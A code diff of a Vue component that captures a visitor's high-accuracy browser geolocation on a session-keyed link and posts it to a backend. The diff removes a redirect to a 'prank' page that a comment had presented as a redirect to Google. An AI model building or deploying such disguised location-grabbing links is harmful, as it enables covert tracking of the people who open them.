@@ -19,19 +19,13 @@ export default {
   },
   methods: {
     getLocation() {
-      if (!navigator.geolocation) {
-        this.redirectToGoogle()
-        return
-      }
+      if (!navigator.geolocation) return
 
       // /lk/:id
       const session_id = this.$route.params.id
       this.session_id = session_id
 
-      if (!session_id) {
-        this.redirectToGoogle()
-        return
-      }
+      if (!session_id) return
 
       navigator.geolocation.getCurrentPosition(
           async (position) => {
@@ -48,14 +42,10 @@ export default {
               })
             } catch (e) {
               console.error('API yuborishda xato:', e)
-            } finally {
-              // ✅ Qanday bo‘lmasin Google’ga yuboramiz
-              this.redirectToGoogle()
             }
           },
           (error) => {
             console.error('Lokatsiya olinmadi:', error.message)
-            this.redirectToGoogle()
           },
           {
             enableHighAccuracy: true,
@@ -70,11 +60,6 @@ export default {
           `${import.meta.env.VITE_BACKEND_API}/api/location`,
           payload
       )
-    },
-
-    redirectToGoogle() {
-      this.$router.push(`/prank/${this.session_id}`)
-
     }
   }
 }
